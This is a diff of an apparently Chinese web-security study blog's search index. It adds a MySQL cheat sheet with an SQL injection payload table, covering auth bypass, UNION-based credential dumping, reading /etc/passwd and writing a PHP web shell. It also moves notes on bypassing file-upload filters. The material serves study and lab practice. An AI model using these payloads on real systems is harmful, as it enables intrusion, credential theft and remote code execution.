@@ -4,11 +4,36 @@
   
     
     <entry>
-      <title></title>
-      <link href="/2022/04/29/Hackthebox/"/>
-      <url>/2022/04/29/Hackthebox/</url>
+      <title>MYSQL基础</title>
+      <link href="/2022/05/07/MYSQL%E5%9F%BA%E7%A1%80/"/>
+      <url>/2022/05/07/MYSQL%E5%9F%BA%E7%A1%80/</url>
       
-        <content type="html"><![CDATA[<p></p>]]></content>
+        <content type="html"><![CDATA[<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><table><thead><tr><th><strong>Command</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><strong>General</strong></td><td></td></tr><tr><td><code>mysql -u root -h docker.hackthebox.eu -P 3306 -p</code></td><td>login to mysql database</td></tr><tr><td><code>SHOW DATABASES</code></td><td>List available databases</td></tr><tr><td><code>USE users</code></td><td>Switch to database</td></tr><tr><td><strong>Tables</strong></td><td></td></tr><tr><td><code>CREATE TABLE logins (id INT, ...)</code></td><td>Add a new table</td></tr><tr><td><code>SHOW TABLES</code></td><td>List available tables in current database</td></tr><tr><td><code>DESCRIBE logins</code></td><td>Show table properties and columns</td></tr><tr><td><code>INSERT INTO table_name VALUES (value_1,..)</code></td><td>Add values to table</td></tr><tr><td><code>INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)</code></td><td>Add values to specific columns in a table</td></tr><tr><td><code>UPDATE table_name SET column1=newvalue1, ... WHERE &lt;condition&gt;</code></td><td>Update table values</td></tr><tr><td><strong>Columns</strong></td><td></td></tr><tr><td><code>SELECT * FROM table_name</code></td><td>Show all columns in a table</td></tr><tr><td><code>SELECT column1, column2 FROM table_name</code></td><td>Show specific columns in a table</td></tr><tr><td><code>DROP TABLE logins</code></td><td>Delete a table</td></tr><tr><td><code>ALTER TABLE logins ADD newColumn INT</code></td><td>Add new column</td></tr><tr><td><code>ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn</code></td><td>Rename column</td></tr><tr><td><code>ALTER TABLE logins MODIFY oldColumn DATE</code></td><td>Change column datatype</td></tr><tr><td><code>ALTER TABLE logins DROP oldColumn</code></td><td>Delete column</td></tr><tr><td><strong>Output</strong></td><td></td></tr><tr><td><code>SELECT * FROM logins ORDER BY column_1</code></td><td>Sort by column</td></tr><tr><td><code>SELECT * FROM logins ORDER BY column_1 DESC</code></td><td>Sort by column in descending order</td></tr><tr><td><code>SELECT * FROM logins ORDER BY column_1 DESC, id ASC</code></td><td>Sort by two-columns</td></tr><tr><td><code>SELECT * FROM logins LIMIT 2</code></td><td>Only show first two results</td></tr><tr><td><code>SELECT * FROM logins LIMIT 1, 2</code></td><td>Only show first two results starting from index 2</td></tr><tr><td><code>SELECT * FROM table_name WHERE &lt;condition&gt;</code></td><td>List results that meet a condition</td></tr><tr><td><code>SELECT * FROM logins WHERE username LIKE &#39;admin%&#39;</code></td><td>List results where the name is similar to a given string</td></tr></tbody></table><h2 id="MySQL-Operator-Precedence"><a href="#MySQL-Operator-Precedence" class="headerlink" title="MySQL Operator Precedence"></a>MySQL Operator Precedence</h2><ul><li>Division (<code>/</code>), Multiplication (<code>*</code>), and Modulus (<code>%</code>)</li><li>Addition (<code>+</code>) and Subtraction (<code>-</code>)</li><li>Comparison (<code>=</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>!=</code>, <code>LIKE</code>)</li><li>NOT (<code>!</code>)</li><li>AND (<code>&amp;&amp;</code>)</li><li>OR (<code>||</code>)</li></ul><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><table><thead><tr><th><strong>Payload</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><strong>Auth Bypass</strong></td><td></td></tr><tr><td><code>admin&#39; or &#39;1&#39;=&#39;1</code></td><td>Basic Auth Bypass</td></tr><tr><td><code>admin&#39;)-- -</code></td><td>Basic Auth Bypass With comments</td></tr><tr><td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass">Auth Bypass Payloads</a></td><td></td></tr><tr><td><strong>Union Injection</strong></td><td></td></tr><tr><td><code>&#39; order by 1-- -</code></td><td>Detect number of columns using <code>order by</code></td></tr><tr><td><code>cn&#39; UNION select 1,2,3-- -</code></td><td>Detect number of columns using Union injection</td></tr><tr><td><code>cn&#39; UNION select 1,@@version,3,4-- -</code></td><td>Basic Union injection</td></tr><tr><td><code>UNION select username, 2, 3, 4 from passwords-- -</code></td><td>Union injection for 4 columns</td></tr><tr><td><strong>DB Enumeration</strong></td><td></td></tr><tr><td><code>SELECT @@version</code></td><td>Fingerprint MySQL with query output</td></tr><tr><td><code>SELECT SLEEP(5)</code></td><td>Fingerprint MySQL with no output</td></tr><tr><td><code>cn&#39; UNION select 1,database(),2,3-- -</code></td><td>Current database name</td></tr><tr><td><code>cn&#39; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</code></td><td>List all databases</td></tr><tr><td><code>cn&#39; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#39;dev&#39;-- -</code></td><td>List all tables in a specific database</td></tr><tr><td><code>cn&#39; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&#39;credentials&#39;-- -</code></td><td>List all columns in a specific table</td></tr><tr><td><code>cn&#39; UNION select 1, username, password, 4 from dev.credentials-- -</code></td><td>Dump data from a table in another database</td></tr><tr><td><strong>Privileges</strong></td><td></td></tr><tr><td><code>cn&#39; UNION SELECT 1, user(), 3, 4-- -</code></td><td>Find current user</td></tr><tr><td><code>cn&#39; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=&quot;root&quot;-- -</code></td><td>Find if user has admin privileges</td></tr><tr><td><code>cn&#39; UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user=&quot;root&quot;-- -</code></td><td>Find if all user privileges</td></tr><tr><td><code>cn&#39; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- -</code></td><td>Find which directories can be accessed through MySQL</td></tr><tr><td><strong>File Injection</strong></td><td></td></tr><tr><td><code>cn&#39; UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;), 3, 4-- -</code></td><td>Read local file</td></tr><tr><td><code>select &#39;file written successfully!&#39; into outfile &#39;/var/www/html/proof.txt&#39;</code></td><td>Write a string to a local file</td></tr><tr><td><code>cn&#39; union select &quot;&quot;,&#39;&lt;?php system($_REQUEST[0]); ?&gt;&#39;, &quot;&quot;, &quot;&quot; into outfile &#39;/var/www/html/shell.php&#39;-- -</code></td><td>Write a web shell into the base web directory</td></tr></tbody></table>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> mysql </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hackthebox</title>
+      <link href="/2022/04/30/Hackthebox/"/>
+      <url>/2022/04/30/Hackthebox/</url>
+      
+        <content type="html"><![CDATA[]]></content>
       
       
       
@@ -36,19 +61,6 @@
             <tag> 逻辑漏洞 </tag>
             
         </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>SQL注入</title>
-      <link href="/2021/12/06/SQL%E6%B3%A8%E5%85%A5/"/>
-      <url>/2021/12/06/SQL%E6%B3%A8%E5%85%A5/</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-      
       
     </entry>
     
@@ -105,31 +117,6 @@
     
     
     <entry>
-      <title>web安全读书笔记</title>
-      <link href="/2021/12/01/web%E5%AE%89%E5%85%A8%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
-      <url>/2021/12/01/web%E5%AE%89%E5%85%A8%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
-      
-        <content type="html"><![CDATA[<h1 id="文件上传攻击"><a href="#文件上传攻击" class="headerlink" title="文件上传攻击"></a>文件上传攻击</h1><p>文件上传攻击是攻击者利用Web应用对上传文件过滤不严的漏洞，攻击者将木马上传成功后即可获得当前的webshell。</p><h2 id="1-攻击原理"><a href="#1-攻击原理" class="headerlink" title="1.攻击原理"></a>1.攻击原理</h2><p>假设目标web服务器为Apache+PHP的架构，攻击者通过上传功能上传  “木马”.PHP 到服务器，再访问   “木马”.PHP   所在的目录，由此  “木马”.PHP  会被当做PHP文件执行，进而木马生效。<strong>（需要注意网页用什么语言编写，就要用该语言的木马来上传）</strong></p><h2 id="2-文件上传流程"><a href="#2-文件上传流程" class="headerlink" title="2.文件上传流程"></a>2.文件上传流程</h2><p>整个过程分为三大步骤：</p><ol><li>客户端上传：用户提交上传表单，利用HTML格式实现上传格式的编制（**通过HTML格式中的<from>**），再封装到HTTP包中，开始传输。</li><li>中间件上传：接受客户端提交的HTML表单；将表单内容存储为临时文件；根据安全规范，将临时文件保存为正式文件。</li><li>服务器存储及调用：服务器存储正式文件，并将其存放在中间件规定的真实路径。</li></ol><h2 id="3-上传攻击的条件"><a href="#3-上传攻击的条件" class="headerlink" title="3.上传攻击的条件"></a>3.上传攻击的条件</h2><ol><li>目标网站具有上传功能</li><li>上传的目标文件能被Web服务器解析执行</li><li>知道文件上传到服务器后的存放路径与文件名称</li><li>目标文件可以被用户访问</li></ol><h2 id="4-上传检测绕过技术"><a href="#4-上传检测绕过技术" class="headerlink" title="4.上传检测绕过技术"></a>4.上传检测绕过技术</h2><h3 id="4-1-客户端JavaScript检测及绕过"><a href="#4-1-客户端JavaScript检测及绕过" class="headerlink" title="4.1.客户端JavaScript检测及绕过"></a>4.1.客户端JavaScript检测及绕过</h3><h4 id="4-1-1-JS防护"><a href="#4-1-1-JS防护" class="headerlink" title="4.1.1 JS防护"></a>4.1.1 JS防护</h4><p>在网站中部署JS脚本，在用户访问时，脚本随同网页一起到达客户端浏览器，当用户进行文件上传时，JS脚本对用户表单提交的数据进行检查，如果发现非法后缀则直接终止上传。（一般在上传表单中，例如利用<form>中的onsubmit，onchange事件激活防护代码）</p><h4 id="4-1-2-JS防护绕过方式"><a href="#4-1-2-JS防护绕过方式" class="headerlink" title="4.1.2 JS防护绕过方式"></a>4.1.2 JS防护绕过方式</h4><ol><li>浏览器F12打开开发者工具后删除代码里激活防护代码的事件</li><li>直接更改JS脚本，加入木马的扩展名。</li><li>用户浏览器禁用JS功能，导致过滤功能失效</li></ol><h4 id="pikachu练习平台实例"><a href="#pikachu练习平台实例" class="headerlink" title="pikachu练习平台实例"></a>pikachu练习平台实例</h4><p>1.客户端JS检测</p><p><img src="/images/image-20220315161852078.png" alt="image-20220315161852078"></p><p><img src="/images/image-20220315161911659.png" alt="image-20220315161911659"></p><p>直接删除onchange事件即可完成文件上传</p><h3 id="4-2-服务器端MIME检测及绕过"><a href="#4-2-服务器端MIME检测及绕过" class="headerlink" title="4.2 服务器端MIME检测及绕过"></a>4.2 服务器端MIME检测及绕过</h3><h4 id="4-2-1-MIME防护"><a href="#4-2-1-MIME防护" class="headerlink" title="4.2.1 MIME防护"></a>4.2.1 MIME防护</h4><p>MIME值就是HTTP协议中的Content-Type类型，其防护思路是客户端的浏览器根据上传的文件的后缀名自动生成Content-Type类型，服务器收到HTTP包后，会判断Content-Type是否合法，如果非法则阻断本次上传。</p><p><img src="/images/image-20220315164052339.png" alt="image-20220315164052339"></p><h4 id="4-2-2-MIME防护绕过方式"><a href="#4-2-2-MIME防护绕过方式" class="headerlink" title="4.2.2 MIME防护绕过方式"></a>4.2.2 MIME防护绕过方式</h4><ul><li>HTTP抓包后修改Content-Type类型进而绕过防护，实现木马的上传。</li></ul><h4 id="pikachu练习平台实例-1"><a href="#pikachu练习平台实例-1" class="headerlink" title="pikachu练习平台实例"></a>pikachu练习平台实例</h4><p><img src="/images/image-20220315163840463.png" alt="image-20220315163840463"></p><p>直接将Content-Type类型改为image/jpg 就可以完成绕过。</p><h3 id="4-3-服务器端文件扩展名检测及绕过"><a href="#4-3-服务器端文件扩展名检测及绕过" class="headerlink" title="4.3 服务器端文件扩展名检测及绕过"></a>4.3 服务器端文件扩展名检测及绕过</h3><h4 id="4-3-1-防护思路"><a href="#4-3-1-防护思路" class="headerlink" title="4.3.1 防护思路"></a>4.3.1 防护思路</h4><p>通过服务器对上传的文件扩展名进行检测来判断是否合法，防护手段有<strong>白名单（允许）过滤，黑名单（限制）过滤，文件后缀和文件名重命名</strong>。</p><h4 id="4-3-2-绕过方式"><a href="#4-3-2-绕过方式" class="headerlink" title="4.3.2 绕过方式"></a>4.3.2 绕过方式</h4><p>针对黑名单绕过方式：</p><ul><li>多重测试过滤文件名：可以尝试php4, php5、cer等后缀，此类后缀名不受黑名单限制，同时仍然按照php文件执行。</li><li>判断是否存在大小写绕过：中间件会区分文件名的大小写，但是操作系统不会区分，所以可以修改大小写查看是否可以绕过。</li><li>windows下特殊文件名构造：<strong>构造shell.php.和shell.php_</strong>,由于windows不识别上述后缀机制会自动去掉   <strong>.</strong>   和   <strong>_</strong>   ，从而绕过。</li></ul>]]></content>
-      
-      
-      <categories>
-          
-          <category> web安全 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 读书笔记 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>web漏洞</title>
       <link href="/2021/12/01/web%E6%BC%8F%E6%B4%9E/"/>
       <url>/2021/12/01/web%E6%BC%8F%E6%B4%9E/</url>
@@ -147,6 +134,31 @@
         <tags>
             
             <tag> web漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>文件上传</title>
+      <link href="/2021/12/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+      <url>/2021/12/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+      
+        <content type="html"><![CDATA[<h1 id="文件上传攻击"><a href="#文件上传攻击" class="headerlink" title="文件上传攻击"></a>文件上传攻击</h1><p>文件上传攻击是攻击者利用Web应用对上传文件过滤不严的漏洞，攻击者将木马上传成功后即可获得当前的webshell。</p><h2 id="1-攻击原理"><a href="#1-攻击原理" class="headerlink" title="1.攻击原理"></a>1.攻击原理</h2><p>假设目标web服务器为Apache+PHP的架构，攻击者通过上传功能上传  “木马”.PHP 到服务器，再访问   “木马”.PHP   所在的目录，由此  “木马”.PHP  会被当做PHP文件执行，进而木马生效。<strong>（需要注意网页用什么语言编写，就要用该语言的木马来上传）</strong></p><h2 id="2-文件上传流程"><a href="#2-文件上传流程" class="headerlink" title="2.文件上传流程"></a>2.文件上传流程</h2><p>整个过程分为三大步骤：</p><ol><li>客户端上传：用户提交上传表单，利用HTML格式实现上传格式的编制（**通过HTML格式中的<from>**），再封装到HTTP包中，开始传输。</li><li>中间件上传：接受客户端提交的HTML表单；将表单内容存储为临时文件；根据安全规范，将临时文件保存为正式文件。</li><li>服务器存储及调用：服务器存储正式文件，并将其存放在中间件规定的真实路径。</li></ol><h2 id="3-上传攻击的条件"><a href="#3-上传攻击的条件" class="headerlink" title="3.上传攻击的条件"></a>3.上传攻击的条件</h2><ol><li>目标网站具有上传功能</li><li>上传的目标文件能被Web服务器解析执行</li><li>知道文件上传到服务器后的存放路径与文件名称</li><li>目标文件可以被用户访问</li></ol><h2 id="4-上传检测绕过技术"><a href="#4-上传检测绕过技术" class="headerlink" title="4.上传检测绕过技术"></a>4.上传检测绕过技术</h2><h3 id="4-1-客户端JavaScript检测及绕过"><a href="#4-1-客户端JavaScript检测及绕过" class="headerlink" title="4.1.客户端JavaScript检测及绕过"></a>4.1.客户端JavaScript检测及绕过</h3><h4 id="4-1-1-JS防护"><a href="#4-1-1-JS防护" class="headerlink" title="4.1.1 JS防护"></a>4.1.1 JS防护</h4><p>在网站中部署JS脚本，在用户访问时，脚本随同网页一起到达客户端浏览器，当用户进行文件上传时，JS脚本对用户表单提交的数据进行检查，如果发现非法后缀则直接终止上传。（一般在上传表单中，例如利用<form>中的onsubmit，onchange事件激活防护代码）</p><h4 id="4-1-2-JS防护绕过方式"><a href="#4-1-2-JS防护绕过方式" class="headerlink" title="4.1.2 JS防护绕过方式"></a>4.1.2 JS防护绕过方式</h4><ol><li>浏览器F12打开开发者工具后删除代码里激活防护代码的事件</li><li>直接更改JS脚本，加入木马的扩展名。</li><li>用户浏览器禁用JS功能，导致过滤功能失效</li></ol><h4 id="pikachu练习平台实例"><a href="#pikachu练习平台实例" class="headerlink" title="pikachu练习平台实例"></a>pikachu练习平台实例</h4><p>1.客户端JS检测</p><p><img src="/images/image-20220315161852078.png" alt="image-20220315161852078"></p><p><img src="/images/image-20220315161911659.png" alt="image-20220315161911659"></p><p>直接删除onchange事件即可完成文件上传</p><h3 id="4-2-服务器端MIME检测及绕过"><a href="#4-2-服务器端MIME检测及绕过" class="headerlink" title="4.2 服务器端MIME检测及绕过"></a>4.2 服务器端MIME检测及绕过</h3><h4 id="4-2-1-MIME防护"><a href="#4-2-1-MIME防护" class="headerlink" title="4.2.1 MIME防护"></a>4.2.1 MIME防护</h4><p>MIME值就是HTTP协议中的Content-Type类型，其防护思路是客户端的浏览器根据上传的文件的后缀名自动生成Content-Type类型，服务器收到HTTP包后，会判断Content-Type是否合法，如果非法则阻断本次上传。</p><p><img src="/images/image-20220315164052339.png" alt="image-20220315164052339"></p><h4 id="4-2-2-MIME防护绕过方式"><a href="#4-2-2-MIME防护绕过方式" class="headerlink" title="4.2.2 MIME防护绕过方式"></a>4.2.2 MIME防护绕过方式</h4><ul><li>HTTP抓包后修改Content-Type类型进而绕过防护，实现木马的上传。</li></ul><h4 id="pikachu练习平台实例-1"><a href="#pikachu练习平台实例-1" class="headerlink" title="pikachu练习平台实例"></a>pikachu练习平台实例</h4><p><img src="/images/image-20220315163840463.png" alt="image-20220315163840463"></p><p>直接将Content-Type类型改为image/jpg 就可以完成绕过。</p><h3 id="4-3-服务器端文件扩展名检测及绕过"><a href="#4-3-服务器端文件扩展名检测及绕过" class="headerlink" title="4.3 服务器端文件扩展名检测及绕过"></a>4.3 服务器端文件扩展名检测及绕过</h3><h4 id="4-3-1-防护思路"><a href="#4-3-1-防护思路" class="headerlink" title="4.3.1 防护思路"></a>4.3.1 防护思路</h4><p>通过服务器对上传的文件扩展名进行检测来判断是否合法，防护手段有<strong>白名单（允许）过滤，黑名单（限制）过滤，文件后缀和文件名重命名</strong>。</p><h4 id="4-3-2-绕过方式"><a href="#4-3-2-绕过方式" class="headerlink" title="4.3.2 绕过方式"></a>4.3.2 绕过方式</h4><p>针对黑名单绕过方式：</p><ul><li>多重测试过滤文件名：可以尝试php4, php5、cer等后缀，此类后缀名不受黑名单限制，同时仍然按照php文件执行。</li><li>判断是否存在大小写绕过：中间件会区分文件名的大小写，但是操作系统不会区分，所以可以修改大小写查看是否可以绕过。</li><li>windows下特殊文件名构造：<strong>构造shell.php.和shell.php_</strong>,由于windows不识别上述后缀机制会自动去掉   <strong>.</strong>   和   <strong>_</strong>   ，从而绕过。</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web安全 </tag>
             
         </tags>
       
